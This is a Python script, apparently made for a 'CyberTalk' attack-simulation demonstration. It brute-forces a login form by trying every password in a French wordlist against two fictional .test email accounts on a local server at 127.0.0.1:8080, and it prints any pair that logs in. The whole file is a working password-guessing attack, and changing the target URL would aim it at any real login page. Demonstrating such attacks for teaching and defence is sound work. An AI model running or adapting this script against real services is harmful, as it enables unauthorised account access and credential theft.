#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    CyberAttackSimulation for CyberTalk
#    Copyright (C) 2025  CyberAttackSimulation

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

from urllib.request import Request, urlopen
from urllib.error import HTTPError
from urllib.parse import quote

counter = 0

def get_credentials(usernames: list[str]):
    for password in open("french_passwords.txt"):
        password = password.strip()
        for username in usernames:
            yield username, password

for username, password in get_credentials(('henri.brosquet@sylphora-dynamics.test', 'bertille.demoulin@sylphora-dynamics.test')):
    counter += 1
    try:
        urlopen(Request("http://127.0.0.1:8080/login", data=f"username={quote(username)}&password={quote(password)}".encode(), method="POST"))
    except HTTPError as e:
        if e.code == 500:
            raise e
        elif e.code == 401:
            ...
#         elif e.code == 403 or e.code == 404:
#             print("Credentials found:", username, password)
        ...
    else:
        print("Credentials found:", username, password)

print(counter, "credentials tried")
